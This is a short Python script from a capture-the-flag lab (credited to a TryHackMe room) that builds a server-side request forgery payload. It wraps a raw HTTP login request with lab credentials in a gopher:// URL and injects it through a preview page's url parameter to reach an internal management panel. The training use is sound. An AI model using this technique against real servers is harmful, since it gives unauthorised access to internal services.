# script provided by 0day https://x.com/0dayCTF
# userd on tryhackme room https://tryhackme.com/room/extract
# youtube video walk through: https://youtu.be/fM9EisT6s54

python3 - <<'PY'
import urllib.parse, sys
body = "username=librarian&password=L1br4r1AN!!"
req = (
  "POST /management/index.php HTTP/1.1\r\n"
  "Host: 127.0.0.1\r\n"
  "Content-Type: application/x-www-form-urlencoded\r\n"
  f"Content-Length: {len(body)}\r\n"
  "Connection: close\r\n"
  "\r\n" + body
)
u = "gopher://127.0.0.1:80/_" + urllib.parse.quote(req, safe='')
print("http://10.10./preview.php?url=" + urllib.parse.quote(u, safe=''))
PY
